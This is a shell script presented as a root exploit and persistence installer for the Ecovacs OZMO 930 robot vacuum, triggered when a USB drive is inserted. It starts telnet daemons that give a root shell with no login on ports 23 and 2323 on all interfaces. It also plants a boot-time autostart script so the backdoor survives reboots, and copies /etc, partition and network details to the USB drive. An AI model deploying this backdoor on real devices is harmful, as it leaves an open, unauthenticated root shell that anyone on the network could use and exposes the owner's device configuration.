#!/bin/sh
# Ecovacs OZMO 930 (DR930 / DG3G) Root Exploit & Persistence Installer
# Triggered via /usr/bin/udisk.sh when USB OTG is inserted
set -x

LOG_FILE="/tmp/pwn_success.log"
echo "=== ECOVACS ROOT EXPLOIT TRIGGERED ===" > $LOG_FILE
date >> $LOG_FILE
echo "Triggered by: $0" >> $LOG_FILE
id >> $LOG_FILE

# Output to serial UART console if connected
echo "=== ROOT EXPLOIT EXECUTED ===" > /dev/ttyFIQ0 2>/dev/null

# 1. Start Telnet daemon immediately on port 23 & 2323 (direct root shell, no login)
killall telnetd 2>/dev/null
/usr/sbin/telnetd -l /bin/sh -b 0.0.0.0 &
/usr/sbin/telnetd -p 2323 -l /bin/sh -b 0.0.0.0 &

echo "Telnetd started on port 23 and 2323" >> $LOG_FILE
echo "Telnetd started on port 23 and 2323" > /dev/ttyFIQ0 2>/dev/null

# 2. Make persistence in writable /data partition
# /etc/rc.d/autostart.sh executes /data/autostart/*.sh as root on every boot
mkdir -p /data/autostart
cat << 'AUTORUN' > /data/autostart/00-root-telnet.sh
#!/bin/sh
case "$1" in
  stop)
    killall telnetd 2>/dev/null
    ;;
  *)
    killall telnetd 2>/dev/null
    /usr/sbin/telnetd -l /bin/sh -b 0.0.0.0 &
    /usr/sbin/telnetd -p 2323 -l /bin/sh -b 0.0.0.0 &
    ;;
esac
AUTORUN
chmod +x /data/autostart/00-root-telnet.sh

echo "Persistence installed to /data/autostart/00-root-telnet.sh" >> $LOG_FILE

# 3. Locate USB Mount Root
SCRIPT_DIR=$(cd "$(dirname "$0")" && pwd)
USB_ROOT=$(cd "${SCRIPT_DIR}/.." && pwd)
if [ ! -f "${USB_ROOT}/pwn.sh" ] && [ -f "${SCRIPT_DIR}/pwn.sh" ]; then
    USB_ROOT="${SCRIPT_DIR}"
fi

# Write confirmation to USB root & data
echo "PWN_SUCCESS - ROOT TELNET DAEMON ACTIVE ON PORT 23 & 2323" > "${USB_ROOT}/PWN_SUCCESS.txt" 2>/dev/null
cp $LOG_FILE "${USB_ROOT}/pwn_log.txt" 2>/dev/null
cp $LOG_FILE /data/PWN_SUCCESS.txt 2>/dev/null

# 4. Dump system configs, manifest, and partitions to USB
DUMP_DIR="${USB_ROOT}/dump"
mkdir -p "${DUMP_DIR}"
cp -r /etc "${DUMP_DIR}/" 2>/dev/null
cp /proc/partitions "${DUMP_DIR}/partitions.txt" 2>/dev/null
cp /proc/cpuinfo "${DUMP_DIR}/cpuinfo.txt" 2>/dev/null
ifconfig -a > "${DUMP_DIR}/ifconfig.txt" 2>/dev/null
netstat -tulpn > "${DUMP_DIR}/netstat.txt" 2>/dev/null

# 5. Play audible confirmation tone/chime
mdsctl audio0 '{"todo":"audio", "cmd":"play","file_number":69}' 2>/dev/null &
ogg123 /media/music/ZH/1.ogg 2>/dev/null &
beep 2>/dev/null &

sync
exit 0
